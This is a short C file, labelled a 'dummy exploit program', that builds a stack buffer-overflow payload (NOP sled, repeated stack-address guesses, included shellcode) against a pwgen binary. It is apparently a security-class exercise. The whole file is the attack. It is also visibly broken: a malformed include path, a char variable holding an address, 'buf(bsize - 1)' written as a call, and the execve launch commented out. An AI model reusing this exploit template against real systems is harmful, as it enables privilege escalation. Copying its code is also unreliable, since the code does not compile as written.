/*
 * dummy exploit program
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <usr/local/src/shellcode.h>

#define bsize 2048
#define TARGET "/usr/local/bin/pwgen"
#define NOP   0x90
unsigned long get_sp(void){
__asm__("movl %esp, %eax");
}

int main(void)
{
  char *args[4];
  char *env[1];
  char *buf, *ptr;
  char *addr_ptr, addr;
  // one way to invoke pwgen, system() creates a separate process
  int i;

  if(!(buf = malloc(2048))){
    printf("error");
    exit(0);
  }
  // another way
  args[0] = TARGET; args[1] = "-f";
  args[2] = ""; args[3] = NULL;
  addr = get_sp();
  printf("Using address 0x%x...", addr);


  ptr = buf;
  addr_ptr = (long *) ptr;
  for (i = 0; i < bsize; i+=4)
  *(addr_ptr++) = addr;
  for(i = 0 ; i < bsize/2 ; i++)
  buf[i] = NOP;

  ptr = buf + ((bsize/2) - (strlen(shellcode)/2 ));
  for (i = 0 ; i <strlen(shellcode);i++)
      *(ptr++) = shellcode[i];
    buf(bsize - 1) = '\0';
    printf("%s",buf);
  env[0] = NULL;
  // execve() executes the target program by overwriting the
  // memory of the process in which execve() is executing, i.e.,
  // execve() should never return
//  if (execve(TARGET, args, env) < 0)
//  fprintf(stderr, "execve failed.\n");

  exit(0);
}
